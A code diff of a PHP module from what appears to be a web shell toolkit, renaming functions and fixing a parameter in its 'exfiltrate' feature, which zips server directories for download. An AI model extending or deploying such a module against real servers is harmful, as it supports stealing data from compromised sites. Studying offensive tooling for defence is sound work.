@@ -46,7 +46,7 @@ function __PREFIX__makeExfiltratePage(&$page_content, $features, $page, $css) {
             empty($_GET["status"])
                 ? ""
                 : __PREFIX__openCommandOutputScreen(true) .
-                  htmlentities($_GET["error"]) .
+                  htmlentities($_GET["status"]) .
                   __PREFIX__closeCommandOutputScreen(true),
         )
     );
@@ -140,9 +140,12 @@ function __PREFIX__addDirectoryToZip($dir, $zip, $recursive, $extensions, $clean
 /**
  * Handle the zip creation process
  *
+ * @param $operation string The operation to handle
+ * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features container
+ *
  * @return void
  */
-function __PREFIX__handleCreateZip() {
+function __PREFIX__handleExfiltrate($operation, $features) {
     $content = $_POST['__PARAM_1__'];
 
     // ensure the zip extension is loaded
@@ -238,7 +241,7 @@ function __PREFIX__handleCreateZip() {
  *
  * @return void
  */
-function __PREFIX__exfiltrate_hooks_isolated_ops(&$isolated_ops) {
+function __PREFIX__exfiltrateHooksIsolatedOps(&$isolated_ops) {
     global $EXFILTRATE;
 
     $isolated_ops[] = $EXFILTRATE;
@@ -252,7 +255,7 @@ function __PREFIX__exfiltrate_hooks_isolated_ops(&$isolated_ops) {
  *
  * @return void
  */
-function __PREFIX__exfiltrate_hooks_features(&$features) {
+function __PREFIX__exfiltrateHooksFeatures(&$features) {
     global $EXFILTRATE;
 
     $features[] = array(
@@ -268,8 +271,8 @@ function __PREFIX__exfiltrate_hooks_features(&$features) {
 // section.functions.end
 
 // section.hooks
-add_hook("isolated_ops", "__PREFIX__exfiltrate_hooks_isolated_ops");
-add_hook("features", "__PREFIX__exfiltrate_hooks_features");
+add_hook("isolated_ops", "__PREFIX__exfiltrateHooksIsolatedOps");
+add_hook("features", "__PREFIX__exfiltrateHooksFeatures");
 add_named_hook("GET_page", $EXFILTRATE, "__PREFIX__makeExfiltratePage");
-add_named_hook("POST_operation", $EXFILTRATE, "__PREFIX__handleCreateZip");
+add_named_hook("POST_operation", $EXFILTRATE, "__PREFIX__handleExfiltrate");
 // section.hooks.end
